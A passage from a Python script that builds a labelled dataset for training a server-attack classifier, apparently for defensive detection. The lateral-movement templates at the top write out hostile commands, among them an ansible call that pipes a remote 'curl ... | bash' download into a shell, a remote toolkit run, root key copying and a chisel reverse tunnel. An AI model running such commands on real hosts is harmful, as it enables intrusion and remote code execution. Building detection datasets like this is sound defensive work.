            f"ssh -L {random.randint(8000,9999)}:{dst_ip}:3306 {user}@{dst_ip}",
            f"ansible all -i '{dst_ip},' -m shell -a 'curl http://{rand_ip()}/c | bash' -u {user}",
            f"rsync -avz /tmp/toolkit/ {user}@{dst_ip}:/tmp/toolkit/ && ssh {user}@{dst_ip} '/tmp/toolkit/run.sh'",
            f"ssh-copy-id -i /root/.ssh/id_rsa.pub {user}@{dst_ip} && ssh {user}@{dst_ip}",
            f"proxychains ssh {user}@{dst_ip} -D 1080",
            f"chisel server --reverse --port 8080 && chisel client {rand_ip()}:8080 R:socks",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)


# ════════════════════════════════════════════════════════════════
#  BENIGN SERVER LOGS (to augment existing Benign class)
# ════════════════════════════════════════════════════════════════

def gen_benign_server_logs(n=1500):
    payloads = []
    for _ in range(n * 3):
        ts = rand_timestamp()
        host = rand_hostname()
        pid = rand_pid()
        user = random.choice(["deploy", "ubuntu", "www-data", "nginx"])
        ip = rand_ip()

        templates = [
            # Normal SSH
            f"{ts} {host} sshd[{pid}]: Accepted publickey for {user} from {rand_internal_ip()} port {rand_port()} ssh2: ED25519 SHA256:{uuid.uuid4().hex[:20]}",
            f"{ts} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {user}(uid={random.randint(1000,5000)}) by (uid=0)",
            f"{ts} {host} sshd[{pid}]: Received disconnect from {rand_internal_ip()} port {rand_port()}:11: disconnected by user",
            # Normal system
            f"{ts} {host} systemd[1]: Started Daily apt download activities.",
            f"{ts} {host} systemd[1]: Started Session {random.randint(1,999)} of user {user}.",
            f"{ts} {host} CRON[{pid}]: (root) CMD (/usr/lib/php/sessionclean)",
            f"{ts} {host} CRON[{pid}]: ({user}) CMD (cd /opt/app && python3 manage.py clearsessions)",
            f"{ts} {host} systemd[1]: Starting Daily Cleanup of Temporary Directories...",
            f"{ts} {host} kernel: [    0.000000] Linux version 5.15.0-{random.randint(50,120)}-generic",
            # Normal Nginx
            f'{ip} - - [{ts.replace(" ", "/")}] "GET /api/v1/users/{random.randint(1,999)} HTTP/1.1" 200 {random.randint(100,5000)}',
            f'{ip} - - [{ts.replace(" ", "/")}] "POST /api/v1/auth/login HTTP/1.1" 200 {random.randint(100,2000)}',
            f'{ip} - - [{ts.replace(" ", "/")}] "GET /static/css/app.{uuid.uuid4().hex[:8]}.css HTTP/1.1" 200 {random.randint(5000,50000)}',
            f'{ip} - - [{ts.replace(" ", "/")}] "GET /health HTTP/1.1" 200 2',
            # Normal Docker
            f"{ts} {host} dockerd[{pid}]: Container {uuid.uuid4().hex[:12]} started",
            f"docker pull nginx:latest - Pulling from library/nginx - Status: Image is up to date",
            f"docker-compose up -d - Starting service app-web-1 ... done",
            # Normal apt/package
            f"{ts} {host} apt-daily[{pid}]: Running daily update check",
            f"Reading package lists... Done. Building dependency tree... Done. All packages are up to date.",
            # Normal MySQL/Postgres
            f"{ts} {host} mysqld[{pid}]: ready for connections. Version: '8.0.{random.randint(30,40)}' socket: '/var/run/mysqld/mysqld.sock' port: 3306",
            f"{ts} {host} postgres[{pid}]: database system is ready to accept connections",
            # Normal certbot
            f"{ts} {host} certbot[{pid}]: Certificate not yet due for renewal",
            f"{ts} {host} systemd[1]: Finished Let's Encrypt renewal.",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)


# ════════════════════════════════════════════════════════════════
#  MAIN: BUILD ENTERPRISE DATASET
# ════════════════════════════════════════════════════════════════

def main():
    print("="*70)
    print("🏗️  ENTERPRISE VPS SECURITY AI — DATASET GENERATOR")
    print("="*70)

    # ── Step 1: Load existing dataset
    EXISTING_DATASET = "./balanced_attack_dataset.csv"
    if os.path.exists(EXISTING_DATASET):
        df_existing = pd.read_csv(EXISTING_DATASET)
        print(f"\n✅ Loaded existing dataset: {len(df_existing)} samples, {df_existing['label'].nunique()} classes")
    else:
        print(f"\n⚠️  {EXISTING_DATASET} not found. Starting from scratch.")
        df_existing = pd.DataFrame(columns=["text", "label"])

    # ── Step 2: Generate all 22 new server attack classes
    print("\n🔧 Generating server attack payloads...\n")

    server_generators = {
        "SSH_BruteForce":              (800, gen_ssh_bruteforce),
        "SSH_Login_Attack":            (800, gen_ssh_login_attack),
        "ReverseShell":                (800, gen_reverse_shell),
        "PrivilegeEscalation":         (800, gen_privilege_escalation),
        "Suspicious_Bash_Command":     (800, gen_suspicious_bash),
        "Linux_Command_Injection":     (800, gen_linux_cmd_injection),
        "WebShell":                    (800, gen_webshell),
        "PortScanning":                (800, gen_port_scanning),
        "Docker_Abuse":                (800, gen_docker_abuse),
        "Cron_Abuse":                  (800, gen_cron_abuse),
        "Persistence":                 (800, gen_persistence),
        "Malicious_System_Command":    (800, gen_malicious_system_cmd),
        "Unauthorized_File_Modification": (800, gen_unauthorized_file_mod),
        "Suspicious_Process":          (800, gen_suspicious_process),
        "System_Enumeration":          (800, gen_system_enumeration),
        "Kernel_Exploit":              (800, gen_kernel_exploit),
        "Linux_Malware":               (800, gen_linux_malware),
        "Ransomware":                  (800, gen_ransomware),
        "Cryptomining":                (800, gen_cryptomining),
        "Failed_Login":                (800, gen_failed_login),
        "Root_Login_Attempt":          (800, gen_root_login_attempt),
        "Lateral_Movement":            (800, gen_lateral_movement),
    }

    new_data = []
    for label, (count, gen_func) in server_generators.items():
        payloads = gen_func(count)
        for p in payloads:
            new_data.append({"text": p, "label": label})
        print(f"  ✅ {label:<35} → {len(payloads)} samples")

    # ── Step 3: Generate augmented Benign server logs
    print(f"\n🟢 Generating Benign server logs...")
    benign_logs = gen_benign_server_logs(1500)
    for p in benign_logs:
        new_data.append({"text": p, "label": "Benign"})
    print(f"  ✅ Benign (server logs)              → {len(benign_logs)} samples")

    # ── Step 4: Combine existing + new
    df_new = pd.DataFrame(new_data)
    df_combined = pd.concat([df_existing, df_new], ignore_index=True)

    # ── Step 5: Clean
    print(f"\n🧹 Cleaning dataset...")
    initial_count = len(df_combined)

    # Remove duplicates
    df_combined = df_combined.drop_duplicates(subset=["text"]).reset_index(drop=True)
    print(f"  Removed {initial_count - len(df_combined)} duplicates")

    # Remove empty/NaN
    df_combined = df_combined.dropna(subset=["text", "label"])
    df_combined = df_combined[df_combined["text"].str.strip() != ""].reset_index(drop=True)

    # Normalize encoding
    df_combined["text"] = df_combined["text"].astype(str).str.encode("utf-8", errors="replace").str.decode("utf-8")

    # ── Step 6: Shuffle
    df_combined = df_combined.sample(frac=1, random_state=42).reset_index(drop=True)

    # ── Step 7: Statistics
    print(f"\n📊 Dataset Statistics:")
    print(f"  Total samples : {len(df_combined)}")
    print(f"  Total classes : {df_combined['label'].nunique()}")

    stats = df_combined["label"].value_counts().reset_index()
    stats.columns = ["label", "count"]
    stats["percentage"] = (stats["count"] / len(df_combined) * 100).round(2)

    # Calculate server vs web ratio
    server_classes = list(server_generators.keys())
    server_count = df_combined[df_combined["label"].isin(server_classes)].shape[0]
    web_count = len(df_combined) - server_count
    server_pct = round(server_count / len(df_combined) * 100, 2)

    print(f"  Server attacks: {server_count} ({server_pct}%)")
    print(f"  Web attacks   : {web_count} ({round(100 - server_pct, 2)}%)")

    print(f"\n  Per-class distribution:")
    for _, row in stats.iterrows():
        bar = "█" * int(row["percentage"])
        print(f"    {row['label']:<35} {row['count']:>5}  ({row['percentage']:>5.2f}%) {bar}")

    # ── Step 8: Export CSV
    csv_path = "./enterprise_security_dataset.csv"
    df_combined.to_csv(csv_path, index=False, encoding="utf-8")
    print(f"\n💾 Saved: {csv_path} ({len(df_combined)} samples)")

    # ── Step 9: Export JSON
    json_path = "./enterprise_security_dataset.json"
    try:
        records = df_combined.to_dict(orient="records")
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(records, f, ensure_ascii=False, indent=2)
        print(f"💾 Saved: {json_path}")
    except Exception as e:
        print(f"⚠️ JSON export warning: {e}")

    # ── Step 10: Export Statistics
    stats_path = "./dataset_statistics.csv"
    stats_full = stats.copy()
    stats_full["type"] = stats_full["label"].apply(lambda x: "Server" if x in server_classes else "Web")
    stats_full.to_csv(stats_path, index=False)
    print(f"💾 Saved: {stats_path}")

    print(f"\n{'='*70}")
    print(f"🎉 ENTERPRISE DATASET GENERATION COMPLETE!")
    print(f"   {len(df_combined)} samples | {df_combined['label'].nunique()} classes | Server: {server_pct}%")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()
